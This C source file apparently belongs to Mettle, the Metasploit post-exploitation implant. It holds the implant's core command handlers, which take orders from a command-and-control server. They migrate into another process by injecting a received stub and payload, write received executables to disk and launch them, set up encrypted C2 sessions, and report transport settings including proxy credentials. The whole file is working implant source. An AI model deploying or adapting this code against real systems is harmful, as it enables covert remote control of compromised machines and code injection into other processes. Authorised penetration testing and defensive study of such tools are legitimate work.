/**
 * Copyright 2015 Rapid7
 * @brief Core API calls
 * @file tlv_coreapi.c
 */
#include "crypttlv.h"
#include "log.h"
#include "tlv.h"
#include "command_ids.h"
#include "extensions.h"
#include "util-common.h"
#include "bufferev.h"
#include "network_client.h"
#include "c2.h"
#include "base_inject.h"

#include <mettle.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>


static void migrate_break_cb(struct ev_loop *loop, ev_timer *w, int revents)
{
	struct mettle *m = w->data;
	struct c2 *c2 = mettle_get_c2(m);
	
	if (c2_transport_egress_pending(c2)) {
		ev_timer_set(w, 0.1, 0);
		ev_timer_start(loop, w);
		return;
	}

	ev_break(loop, EVBREAK_ALL);
	free(w);
}

static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
{

	uint32_t pid;
	uint32_t destination_arch;
	size_t payload_length, uuid_length, stub_length;

	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);

#if defined(__x86_64__) || defined(__i386__)
	if(migrate_support())
	{
		tlv_packet_get_u32(ctx->req, TLV_TYPE_MIGRATE_PID, &pid);
		tlv_packet_get_u32(ctx->req, TLV_TYPE_MIGRATE_ARCH, &destination_arch);

		char *payload = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_PAYLOAD, &payload_length);

		// payload cannot be NULL
		if (!payload || payload_length == 0)
			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);

		const char *uuid = tlv_dispatcher_get_uuid(td,&uuid_length);

		char *migrate_stub = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_STUB, &stub_length);

		// stub cannot be NULL
		if (!migrate_stub || stub_length == 0)
			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);

		struct c2 *c2 = mettle_get_c2(m);
		struct c2_transport * transport = c2_get_current_transport(c2);
		int fd = c2_transport_get_socket_fd(transport);

		if(migrate(pid, migrate_stub, stub_length, payload, payload_length, uuid, fd))
		{
			struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
			
			/*
			 * The TCP response is sent faster than HTTP response, so we need to make sure that the Mettle is killed after the response is sent.
			 */
			ev_timer *break_timer = malloc(sizeof(ev_timer));
			if (break_timer) {
				break_timer->data = m;
				ev_timer_init(break_timer, migrate_break_cb, 0.5, 0);
				ev_timer_start(mettle_get_loop(m), break_timer);
			} else {
				// I guess the mettle dies
				ev_break(mettle_get_loop(m), EVBREAK_ALL);
			}
			return p;
		}
	}
#endif

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);

	return p;
}


static void add_command_id(uint32_t command_id, void *arg)
{
	struct tlv_packet **p = arg;
	*p = tlv_packet_add_u32(*p, TLV_TYPE_UINT, command_id);
}

static struct tlv_packet *core_enumextcmd(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;
	uint32_t command_id_start = 0, command_id_end = 0;
	tlv_packet_get_u32(ctx->req, TLV_TYPE_UINT, &command_id_start);
	tlv_packet_get_u32(ctx->req, TLV_TYPE_LENGTH, &command_id_end);
	command_id_end += command_id_start;

	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	tlv_dispatcher_iter_extension_methods(td, command_id_start, command_id_end, add_command_id, &p);
	return p;
}

static struct tlv_packet *core_shutdown(struct tlv_handler_ctx *ctx)
{
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	// We're done, allow main() to cleanup...
	struct mettle *m = ctx->arg;
	ev_break(mettle_get_loop(m), EVBREAK_ALL);

	return p;
}

static struct tlv_packet *core_get_session_guid(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	const char *session_guid = tlv_dispatcher_get_session_guid(td);

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_raw(p, TLV_TYPE_SESSION_GUID, session_guid, SESSION_GUID_LEN);
}

static struct tlv_packet *core_set_session_guid(struct tlv_handler_ctx *ctx)
{
	size_t guid_len = 0;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	char *guid = tlv_packet_get_raw(ctx->req, TLV_TYPE_SESSION_GUID, &guid_len);

	if (!guid || guid_len != SESSION_GUID_LEN)
		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);

	tlv_dispatcher_set_session_guid(td, guid);
	return tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
}

static struct tlv_packet *core_machine_id(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_fmt(p, TLV_TYPE_MACHINE_ID,
		"%s:%s", mettle_get_fqdn(m), mettle_get_machine_id(m));
}

static struct tlv_packet *core_set_uuid(struct tlv_handler_ctx *ctx)
{
	size_t uuid_len = 0;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	char *uuid = tlv_packet_get_raw(ctx->req, TLV_TYPE_UUID, &uuid_len);

	if (uuid && uuid_len) {
		tlv_dispatcher_set_uuid(td, uuid, uuid_len);
	}

	return tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
}

static struct tlv_packet *core_negotiate_tlv_encryption(struct tlv_handler_ctx *ctx)
{
#ifndef __MINGW32__
	size_t guid_len = 0;
	size_t pkey_len = 0;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	char *guid = tlv_packet_get_raw(ctx->req, TLV_TYPE_SESSION_GUID, &guid_len);
	unsigned char *pkey = tlv_packet_get_raw(ctx->req, TLV_TYPE_RSA_PUB_KEY, &pkey_len);

	if (pkey_len > 0) {
		struct tlv_encryption_ctx* enc_ctx = create_tlv_encryption_context(ENC_AES256);
		if (enc_ctx->key != NULL)
		{
			unsigned char buf[MBEDTLS_MPI_MAX_SIZE] = { '\0' };
			int enc_len = 0;
			if ((enc_len = rsa_encrypt_pkcs(pkey, pkey_len, enc_ctx, buf)) > 0)
			{
				struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
				p = tlv_packet_add_u32(p, TLV_TYPE_SYM_KEY_TYPE, ENC_AES256);
				p = tlv_packet_add_raw(p, TLV_TYPE_ENC_SYM_KEY, buf, enc_len);
				tlv_dispatcher_add_encryption(td, enc_ctx);
				return p;
			}
		}
	}
#endif
	return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
}

static struct tlv_packet *core_loadlib(struct tlv_handler_ctx *ctx)
{
	uint32_t flags;
	size_t extension_len;
	struct mettle *m = ctx->arg;
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
	struct tlv_packet *p = NULL;
	struct extension_process *ep = NULL;
	int fd = -1;
	int tlv_result = TLV_RESULT_FAILURE;
	const char *library_path = tlv_packet_get_str(ctx->req, TLV_TYPE_LIBRARY_PATH);
	const char *target_path = tlv_packet_get_str(ctx->req, TLV_TYPE_TARGET_PATH);
	const unsigned char *extension = tlv_packet_get_raw(ctx->req, TLV_TYPE_DATA, &extension_len);

	tlv_packet_get_u32(ctx->req, TLV_TYPE_FLAGS, &flags);
	if (!extension || extension_len == 0) {
		log_error("No extension received");
		goto done;
	}

	if (!library_path) {
		log_error("No extension name specified");
		goto done;
	}

	/* Check if this is a binary image or executable. */
	const char bin_magic_number[] = BIN_MAGIC_NUMBER;
	if (strncmp((const char *)&extension[extension_len - sizeof(bin_magic_number)], bin_magic_number, sizeof(bin_magic_number)) == 0) {
		log_info("Loading extension '%s' from binary image", library_path);

		// Make a copy of this image, don't use the TLV buffer...
		unsigned char *extension_copy = malloc(extension_len);
		if (extension_copy == NULL) {
			log_error("Failed to allocate memory for '%s' binary image", library_path);
			goto done;
		}
		// TODO: free this mem when the extension no longer is running
		memcpy(extension_copy, extension, extension_len);
		ep = extension_start_binary_image(m, library_path, extension, extension_len, NULL);
		if (!ep)
		{
			log_error("Failed to start extension from binary image '%s'", library_path);
			goto done;
		}
	} else {
		/* This is an executable that needs to be saved to the filesystem. */
		log_info("Loading extension '%s' from executable file", library_path);

		fd = open(target_path, O_CREAT|O_WRONLY, 0755);
		if(fd == -1) {
			log_error("Failed to open '%s': %s", target_path, strerror(errno));
			goto done;
		}

		int ret_val = write(fd, extension, extension_len);
		if (ret_val == -1) {
			log_error("Failed to write '%s': %s", target_path, strerror(errno));
			goto done;
		}
		if (ret_val != extension_len) {
			log_error("Failed to write the entire extension '%s' to disk", target_path);
			goto done;
		}
		close(fd);
		fd = -1;

		ep = extension_start_executable(m, target_path, NULL);
		if (!ep)
		{
			log_error("Failed to start extension from file '%s'", target_path);
			goto done;
		}
	}


	tlv_result = TLV_RESULT_SUCCESS;

done:
	if (fd != -1) {
		close(fd);
	}

	if ((tlv_result == TLV_RESULT_SUCCESS) && (ep)) {
		process_write(ep->p, ctx->req, tlv_packet_len(ctx->req));
	} else {
		// Only transmit failures at this point, allowing the extension to send
		// the result itself and thus raise any errors itself.
		p = tlv_packet_response(ctx);
		p = tlv_packet_add_result(p, tlv_result);
	}

	return p;
}

static struct tlv_packet *add_c2_verb(struct tlv_packet *group, uint32_t type,
	struct c2_verb_config *vc)
{
	if (!vc) {
		return group;
	}

	struct tlv_packet *verb = tlv_packet_new(type, 0);
	for (int i = 0; i < vc->uri_count; i++) {
		verb = tlv_packet_add_str(verb, TLV_TYPE_C2_URI, vc->uris[i]);
	}
	verb = tlv_packet_add_u32(verb, TLV_TYPE_C2_ENC_INBOUND, vc->enc_inbound);
	verb = tlv_packet_add_u32(verb, TLV_TYPE_C2_ENC_OUTBOUND, vc->enc_outbound);
	verb = tlv_packet_add_u32(verb, TLV_TYPE_C2_ENC_UUID, vc->enc_uuid);
	verb = tlv_packet_add_u32(verb, TLV_TYPE_C2_PREFIX_SKIP, vc->prefix_skip);
	verb = tlv_packet_add_u32(verb, TLV_TYPE_C2_SUFFIX_SKIP, vc->suffix_skip);
	if (vc->prefix) verb = tlv_packet_add_raw(verb, TLV_TYPE_C2_PREFIX, vc->prefix, vc->prefix_len);
	if (vc->suffix) verb = tlv_packet_add_raw(verb, TLV_TYPE_C2_SUFFIX, vc->suffix, vc->suffix_len);
	if (vc->uuid_prefix) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_UUID_PREFIX, vc->uuid_prefix);
	if (vc->uuid_suffix) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_UUID_SUFFIX, vc->uuid_suffix);
	if (vc->uuid_get) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_UUID_GET, vc->uuid_get);
	if (vc->uuid_header) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_UUID_HEADER, vc->uuid_header);
	if (vc->uuid_cookie) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_UUID_COOKIE, vc->uuid_cookie);
	if (vc->user_agent) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_UA, vc->user_agent);
	if (vc->custom_headers) verb = tlv_packet_add_str(verb, TLV_TYPE_C2_HEADERS, vc->custom_headers);

	return tlv_packet_add_child(group, verb);
}

static struct tlv_packet *core_transport_list(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;
	struct c2 *c2 = mettle_get_c2(m);
	struct c2_transport *transport = c2_get_current_transport(c2);
	struct c2_transport *current_transport = transport;
	
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	
	if (transport == NULL) {
		return p;
	}

	do {
		struct c2_transport_config *tc = c2_transport_get_config(current_transport);
		struct tlv_packet *packet_group;
		if (tc && tc->raw_tlv) {
			packet_group = tlv_packet_from_raw(TLV_TYPE_C2, tc->raw_tlv, tc->raw_tlv_len);
			if (tc->c2_uuid && !tlv_packet_get_str(packet_group, TLV_TYPE_C2_UUID)) {
				packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_UUID, tc->c2_uuid);
			}
		} else {
			packet_group = tlv_packet_new(TLV_TYPE_C2, 0);
			packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_URL, c2_transport_uri(current_transport));
		}

		if (tc && !tc->raw_tlv) {
			packet_group = tlv_packet_add_u32(packet_group, TLV_TYPE_C2_COMM_TIMEOUT, tc->comm_timeout);
			packet_group = tlv_packet_add_u32(packet_group, TLV_TYPE_C2_RETRY_TOTAL, tc->retry_total);
			packet_group = tlv_packet_add_u32(packet_group, TLV_TYPE_C2_RETRY_WAIT, tc->retry_wait);
			if (tc->proxy_url) packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_PROXY_URL, tc->proxy_url);
			if (tc->proxy_user) packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_PROXY_USER, tc->proxy_user);
			if (tc->proxy_pass) packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_PROXY_PASS, tc->proxy_pass);
			if (tc->user_agent) packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_UA, tc->user_agent);
			if (tc->custom_headers) packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_HEADERS, tc->custom_headers);
			if (tc->c2_uuid) packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_C2_UUID, tc->c2_uuid);
			if (tc->cert_hash && tc->cert_hash_len > 0) {
				packet_group = tlv_packet_add_raw(packet_group, TLV_TYPE_C2_CERT_HASH, tc->cert_hash, tc->cert_hash_len);
			}
			packet_group = add_c2_verb(packet_group, TLV_TYPE_C2_GET, tc->c2_get);
			packet_group = add_c2_verb(packet_group, TLV_TYPE_C2_POST, tc->c2_post);
		}

		if (packet_group) {
			p = tlv_packet_add_child(p, packet_group);
		}
		current_transport = c2_get_next_transport(current_transport);
	} while(current_transport != transport);

	return p;
}

void tlv_register_coreapi(struct mettle *m)
{
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);

	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_ENUMEXTCMD, core_enumextcmd, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_MACHINE_ID, core_machine_id, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_SET_UUID, core_set_uuid, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_MIGRATE, core_migrate, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_GET_SESSION_GUID, core_get_session_guid, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_SET_SESSION_GUID, core_set_session_guid, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION, core_negotiate_tlv_encryption, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_LOADLIB, core_loadlib, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_SHUTDOWN, core_shutdown, m);
	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_TRANSPORT_LIST, core_transport_list, m);
}
